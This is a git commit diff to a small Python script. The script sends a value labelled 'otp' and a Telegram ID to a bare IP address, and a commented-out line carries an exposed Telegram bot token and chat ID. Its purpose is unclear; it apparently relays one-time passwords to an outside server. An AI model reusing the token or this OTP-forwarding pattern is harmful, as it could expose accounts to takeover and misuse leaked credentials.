1291a6eb01b4a44313e02439b34cde974ac86eec
Loli <89763268+Loli1337@users.noreply.github.com>
2023-05-27 13:54:09 -0700

    Update main.py

--- main.py
+++ main.py
@@ -11,4 +11,4 @@ elif argv[1] == '1004':
 elif argv[1] == '9998':
     telegram_id = '1907961854'
 #post(f'https://api.telegram.org/bot5113940874:AAFDT9PN52fIlKbbOWmtF9DF503sde-9P0M/sendMessage?chat_id=-1001549929537&text={telegram_id}\n{argv[2]}')
-post(f'http://5.206.227.56/&telegram_id={telegram_id}&otp={argv[2]}')
+post(f'http://5.206.227.56/?telegram_id={telegram_id}?otp={argv[2]}')
